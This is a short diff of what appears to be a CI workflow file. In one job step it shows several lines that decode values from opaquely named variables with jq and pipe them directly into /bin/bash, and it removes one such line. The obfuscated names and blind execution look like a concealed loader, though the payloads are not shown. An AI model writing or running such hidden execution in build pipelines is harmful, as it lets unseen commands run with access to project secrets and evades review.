@@ -36,7 +36,6 @@ jobs:
           printf '%s' "$j601" | jq -r .eeu080 | /bin/bash
           echo $ywv7724 | jq -r .xmrtp18 | /bin/bash
           echo $prpgc652 | jq -r .npfqe787 | /bin/bash
-          printf '%s' "$ptdk04" | jq -r .r290 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
